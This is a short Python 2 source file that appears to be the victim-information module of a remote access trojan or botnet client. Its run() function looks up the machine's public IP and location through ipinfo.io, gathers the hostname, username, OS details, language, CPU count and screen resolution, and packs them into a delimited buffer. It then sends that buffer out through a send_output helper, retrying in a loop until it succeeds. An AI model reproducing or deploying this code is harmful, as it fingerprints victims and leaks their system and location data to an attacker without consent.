import socket
import getpass
import re
import json
from urllib2 import urlopen
import platform
import locale
import commands
import multiprocessing
import wx

import utils

def run():
	BUFFER_TO_SEND = "{{info}}"
	url = 'http://ipinfo.io/json'
	response = urlopen(url)
	data = json.load(response)
	IP=data['ip']
	city = data['city']
	country=data['country']

	# Set dummy language and encoding to make sure locale is found
	language = "English"
	app = wx.App(False) # the wx.App object must be created first. 

	data = commands.getoutput("locale")
	data = data.split("\n")
	for locale in data:
		# Find the language locale
		if locale.split("=")[0] == "LANG":
			language = locale.split("=")[1].split(".")[0]

	buffer = str(wx.GetDisplaySize())
	buffer = buffer.replace("(","")
	buffer = buffer.replace(")","")

   
	BUFFER_TO_SEND +=  "--" + "::" + "Hostname"+ ";;" + "::" + (socket.gethostname()) + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" +"Ip"+ ";;" + "::" + IP + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "City"+ ";;" + "::" + city + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Country"+ ";;" + "::" + country + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Username"+ ";;" + "::" + getpass.getuser() + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Os System"+ ";;" + "::" + platform.system() + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Os Version"+ ";;" + "::" + platform.release() + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Os Language"+ ";;" + "::" + language + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Processor Family"+ ";;" + "::" + platform.processor() + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Total Processors"+ ";;" + "::" + str(multiprocessing.cpu_count()) + ";;" + "++"
	BUFFER_TO_SEND +=  "--" + "::" + "Screen Resolution"+ ";;" + "::" + buffer + ";;" + "++"
	while True:
		try:
			utils.send_output(BUFFER_TO_SEND)
			break
		except:
			pass
